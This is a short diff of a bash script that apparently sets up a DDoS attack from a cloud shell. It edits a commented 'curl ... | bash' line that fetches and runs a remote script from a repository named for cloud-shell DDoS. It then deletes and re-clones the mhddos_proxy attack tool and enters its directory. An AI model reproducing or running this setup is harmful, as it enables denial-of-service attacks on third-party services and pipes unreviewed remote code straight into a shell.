@@ -1,5 +1,5 @@
 #!/bin/bash
-#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
+#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7_test.sh | bash
 rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
